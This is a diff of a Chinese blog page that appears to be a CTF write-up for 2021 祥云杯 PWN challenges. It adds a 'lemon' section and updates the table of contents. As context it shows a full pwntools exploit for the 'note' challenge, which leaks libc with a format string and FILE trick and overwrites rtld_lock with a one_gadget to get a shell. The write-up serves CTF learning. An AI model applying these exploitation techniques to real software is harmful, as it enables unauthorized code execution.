@@ -195,7 +195,7 @@
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>September 03, 2021</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>1983</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>2034</span>
     </div>
   </div>
 </section>
@@ -222,6 +222,8 @@
 <p>成功getshell</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>elf = ELF(<span class="hljs-string">&#x27;./note&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(argv=[elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:libc.path&#125;)<br><br>def <span class="hljs-builtin-name">debug</span>():<br>	gdb.attach(p)<br>def <span class="hljs-builtin-name">add</span>(size, content):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>, str(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;content:&#x27;</span>, content)<br><br><span class="hljs-builtin-name">add</span>(0x20,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(0xfbad1800) + p64(0) * 3 + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 479552<br><span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;libc=&gt;&quot;</span>,hex(libc_base))<br><span class="hljs-builtin-name">debug</span>()<br>ogg = libc_base + 0xf1247<br>rtld_lock = libc_base + 0x5F0F48<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>.ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(rtld_lock))<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(ogg))<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
+<h2 id="lemon"><a href="#lemon" class="headerlink" title="lemon"></a>lemon</h2><p><img   class="lazyload" data-original="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907101349756.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210907101349756</span></p>
+<p>常规checksec一下，64位，保护全开</p>
 
       </section>
       <section class="extra">
@@ -261,7 +263,7 @@
           
   <aside class="toc-wrap">
     <h3 class="toc-title">文章目录：</h3>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#note"><span class="toc-text">note</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#note"><span class="toc-text">note</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lemon"><span class="toc-text">lemon</span></a></li></ol>
   </aside>
 
         
